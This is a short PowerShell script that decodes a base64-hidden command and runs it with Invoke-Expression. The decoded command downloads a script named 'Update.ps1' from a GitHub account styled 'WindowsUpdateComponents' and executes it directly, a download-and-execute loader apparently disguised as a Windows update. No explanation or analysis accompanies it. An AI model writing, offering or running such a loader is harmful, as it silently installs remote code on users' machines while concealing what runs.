[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$encodedCommand = "aXJtIC1VcmkgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9XaW5kb3dzVXBkYXRlQ29tcG9uZW50cy9BcmNoaXZlcy9yZWZzL2hlYWRzL21haW4vVXBkYXRlLnBzMSIgfCBpZXg="

$decodedCommand = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedCommand))
Invoke-Expression $decodedCommand
